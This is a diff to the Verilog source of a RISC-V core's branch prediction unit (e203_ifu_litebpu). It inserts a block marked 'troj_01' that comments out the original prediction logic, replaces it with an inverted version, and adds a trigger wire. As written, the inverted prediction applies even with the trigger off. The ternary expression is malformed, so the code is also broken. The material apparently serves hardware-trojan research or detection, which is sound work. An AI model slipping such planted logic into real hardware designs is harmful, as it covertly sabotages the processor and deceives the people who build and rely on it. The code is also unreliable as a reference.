@@ -82,8 +82,29 @@ module e203_ifu_litebpu(
   //          is calculated based on current PC value and offset
 
   // The JAL and JALR is always jump, bxxx backward is predicted as taken  
-  assign prdt_taken   = (dec_jal | dec_jalr | (dec_bxx & dec_bjp_imm[`E203_XLEN-1]));  
+  //  assign prdt_taken   = (dec_jal | dec_jalr | (dec_bxx & dec_bjp_imm[`E203_XLEN-1]));  
+
+
+  //////////////////////////////////////////////////
+  //////////////////////////////////////////////////
+  //troj_01 begin
+  //20181217
+  //The original one line was commented out above.
+  //adder variable wire prdt_taken_temp
+  //////////////////////////////////////////////////    
+  wire  troj_01_trigger_temp = 1'b0;
+  wire  prdt_taken_temp;
+
+  assign prdt_taken_temp   = ~(dec_jal | dec_jalr | (dec_bxx & dec_bjp_imm[`E203_XLEN-1]));  
+  assign prdt_taken  = troj_01_trigger_temp? (~prdt_taken_temp : prdt_taken_temp);
+
+  //////////////////////////////////////////////////
+  //troj_01 end
+  //////////////////////////////////////////////////
+
   // The JALR with rs1 == x1 have dependency or xN have dependency
+
+
   wire dec_jalr_rs1x0 = (dec_jalr_rs1idx == `E203_RFIDX_WIDTH'd0);
   wire dec_jalr_rs1x1 = (dec_jalr_rs1idx == `E203_RFIDX_WIDTH'd1);
   wire dec_jalr_rs1xn = (~dec_jalr_rs1x0) & (~dec_jalr_rs1x1);
